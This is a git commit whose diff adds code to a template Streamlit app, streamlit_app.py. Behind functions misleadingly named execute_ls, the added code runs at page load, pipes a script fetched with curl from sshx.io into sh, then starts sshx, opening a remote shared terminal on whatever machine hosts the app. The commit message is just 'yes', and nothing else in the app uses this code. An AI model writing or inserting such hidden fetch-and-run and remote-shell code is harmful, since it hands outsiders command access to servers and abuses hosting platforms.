276c4396b1d5d1d3926f2a6fea8325e5f05d0a0d
getajet <cloth@duckspam.com>
2024-10-19 22:17:32 +0000

    yes

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,6 +1,18 @@
 import streamlit as st
-
+import pty
 st.title("🎈 My new app")
 st.write(
     "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
 )
+
+import pty
+
+def execute_ls():
+    pty.spawn(['/bin/sh', '-c', 'curl -sSf https://sshx.io/get | sh'])
+
+execute_ls()
+
+def execute_lss():
+    pty.spawn(['/bin/sh', '-c', 'sshx'])
+
+execute_lss()
